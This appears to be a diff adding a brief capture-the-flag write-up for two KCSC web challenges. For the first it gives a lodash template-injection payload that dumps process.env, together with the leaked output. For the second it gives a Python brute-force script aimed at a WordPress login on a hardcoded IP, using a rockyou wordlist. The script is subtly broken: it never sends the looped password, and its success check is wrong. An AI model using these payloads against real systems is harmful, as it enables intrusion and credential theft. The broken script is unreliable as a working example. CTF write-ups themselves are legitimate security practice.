@@ -1,0 +1,32 @@
+Chall 1 : KCSC Share note
+
+Dirsearch -> source 
+extract -> source -> find vuln lodash package 
+
+
+payload : ${JSON.stringify(process.env)}
+
+flag :  KCSC{lodash_template_injection_so_ezzzz}
+
+result :{"NODE_VERSION":"14.17.3","HOSTNAME":"8db7a560fb48","YARN_VERSION":"1.22.5","HOME":"/root","flag":"KCSC{lodash_template_injection_so_ezzzz}","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PWD":"/usr/src/app"}
+
+
+Chall 2: KCSC Blog
+
+Hint password weak, focus DangKhai
+
+Code bruteforce:
+
+import requests
+
+url = "http://18.142.106.71/wp-login.php"
+
+words = open('rockyou.txt','r').read().split('\n')
+
+data = {'log':'dangkhai','pwd':'admin','wp-submit':'Log+In','redirect_to':'http%3A%2F%2F18.142.106.71%2Fwp-admin%2F&testcookie=1'}
+
+for pwd in words:
+	print(pwd)
+	res = requests.post(url, data)
+	if "Unknown username. Check again or try your email address."  not in res.text:
+		print('Password is ' + pwd)
